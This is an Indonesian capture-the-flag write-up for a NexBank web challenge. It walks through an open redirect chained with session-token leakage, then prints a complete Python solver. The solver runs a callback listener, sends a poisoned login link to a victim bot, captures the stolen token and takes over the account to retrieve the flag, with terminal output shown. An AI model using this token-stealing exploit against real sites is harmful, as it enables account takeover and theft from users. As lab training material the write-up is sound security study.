# WriteUp: Rencana Besar

## Overview

* **Judul:** Rencana Besar
* **Kategori:** Request Manipulation (Open Redirect & Session Poisoning)
* **Poin:** 500
* **Deskripsi:** Bisa ngga lu masuk ke akun bank orang lain?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1337`

## Informasi Attachment

File yang diberikan adalah `nexbank.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Request Manipulation/Rencana Besar]
└─$ tree
.
├── nexbank.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`nexbank.yml`):**

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/nexbank:latest
    ports:
      - "1337:3000"
    environment:
      - PWN=${PWN:-testuser}
    restart: unless-stopped

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose pada port **1337**.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Request Manipulation/Rencana Besar]
└─$ PWN=WanZKey docker compose -f nexbank.yml up -d --build

```

### 2. Source Code Analysis (White Box)

Melakukan inspeksi terhadap source code `src/app.js` di dalam container. Ditemukan rangkaian kerentanan yang memungkinkan pengambilalihan akun (Account Takeover).

**Vulnerability 1: Open Redirect (`app.js`)**

```javascript
app.get('/login', (req, res) => {
    const redirectUrl = req.query.redirect || '/dashboard';

    // VULNERABILITY: Validasi lemah, hanya cek awalan slash '/'
    // Bisa dibypass dengan Protocol Relative URL: //attacker.com
    if (redirectUrl.startsWith('/')) {
        req.session.redirectUrl = redirectUrl;
    }
});

```

**Vulnerability 2: Token Leakage (`app.js`)**

```javascript
app.post('/login', (req, res) => {
    // ...
    // Setelah login sukses, token ditempel langsung di URL redirect
    const finalUrl = `${redirectUrl}?token=${token}`;
    return res.redirect(finalUrl);
});

```

**Analisis Rantai Serangan:**

1. **Open Redirect:** Penyerang dapat membuat link login yang me-redirect user ke server luar (`//IP_ATTACKER/`).
2. **Session Poisoning:** Bot/Korban yang mengklik link tersebut akan login, dan server secara otomatis mengirimkan **Token Sesi** ke URL redirect (server penyerang).
3. **Account Takeover:** Dengan token yang dicuri, penyerang bisa login sebagai korban melalui endpoint `/dashboard?token=...`.

### 3. Exploitation Strategy

Kita menggunakan bot (`bot.js`) yang mensimulasikan korban (user `markonah`) yang akan mengklik link yang kita kirim.

1. **Setup Trap Server:** Menjalankan HTTP Server di IP lokal (`172.xx.xx.xx`) port `4444`.
2. **Craft Payload:** Membuat URL jahat: `http://localhost:1337/login?redirect=//IP_LOKAL:4444/`.
3. **Delivery:** Mengirim URL tersebut ke bot via fitur pesan (`/message`).
4. **Intercept:** Bot login -> Redirect ke Trap Server -> Token bocor di log server kita.
5. **Hijack:** Gunakan token untuk akses Dashboard dan ambil Flag di bagian "Secret PIN".

## Script Solver

Script Python otomatis untuk menjalankan server jebakan, mengirim payload, dan mengambil flag.

**File:** `exploit.py`

```python
import requests
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import re
import socket
import time

# --- KONFIGURASI ---
TARGET_URL = "http://localhost:1337"
CALLBACK_PORT = 4444

# Auto-Detect IP Interface Docker
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

CALLBACK_IP = get_local_ip()

print(f"[*] Detected Local IP: {CALLBACK_IP}")
print(f"[*] Callback Server Port: {CALLBACK_PORT}")

stolen_token = None

class MaliciousServer(BaseHTTPRequestHandler):
    def do_GET(self):
        global stolen_token
        query = urllib.parse.urlparse(self.path).query
        params = urllib.parse.parse_qs(query)
        
        if 'token' in params:
            stolen_token = params['token'][0]
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Token captured.")
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        return

def start_listener():
    server = HTTPServer(('0.0.0.0', CALLBACK_PORT), MaliciousServer)
    server.handle_request()

def exploit():
    global stolen_token
    
    # 1. Start Listener
    print(f"[*] Starting Trap Server on {CALLBACK_IP}:{CALLBACK_PORT}...")
    server_thread = threading.Thread(target=start_listener)
    server_thread.start()
    time.sleep(1)
    
    # 2. Kirim Payload Open Redirect
    redirect_payload = f"//{CALLBACK_IP}:{CALLBACK_PORT}/"
    malicious_link = f"{TARGET_URL}/login?redirect={redirect_payload}"
    
    print(f"[*] Sending Payload to Bot...")
    try:
        r = requests.post(f"{TARGET_URL}/message/send", data={'url': malicious_link})
        if "Message sent" in r.text:
            print("[+] Payload sent! Waiting for Bot to bite...")
    except Exception as e:
        print(f"[-] Error: {e}")
        return

    # 3. Tunggu Token
    server_thread.join(timeout=10)
    
    if stolen_token:
        print(f"\n[+] INTERCEPTED! Token: {stolen_token}")
        
        # 4. Ambil Flag di Dashboard
        print("[*] Using token to fetch Dashboard and grep FLAG...")
        try:
            url_dashboard = f"{TARGET_URL}/dashboard?token={stolen_token}"
            r_dash = requests.get(url_dashboard)
            
            flag_match = re.search(r'pwn\{.*?\}', r_dash.text)
            
            print("-" * 50)
            if flag_match:
                print(f"[!!!] JACKPOT! FLAG: {flag_match.group(0)}")
            else:
                print("[-] Token valid, tapi flag tidak ditemukan.")
            print("-" * 50)
                
        except Exception as e:
            print(f"[-] Error accessing dashboard: {e}")
    else:
        print("\n[-] Timeout! Bot tidak konek.")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Solver

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Request Manipulation/Rencana Besar]
└─$ ./exploit.py
[*] Detected Local IP: 172.22.171.158
[*] Callback Server Port: 4444
[*] Starting Trap Server on 172.22.171.158:4444...
[*] Sending Payload to Bot...
[+] Payload sent! Waiting for Bot to bite...

[+] INTERCEPTED! Token: d9c44309f9103f26895ea517aa16ffe32fcc2f83486d0deeea4078d532bfb9ad
[*] Using token to fetch Dashboard and grep FLAG...
--------------------------------------------------
[!!!] JACKPOT! FLAG: pwn{8fcaf5aad6336815f2c7cbb71c517778}
--------------------------------------------------

```

## Flag

```
pwn{8fcaf5aad6336815f2c7cbb71c517778}

```
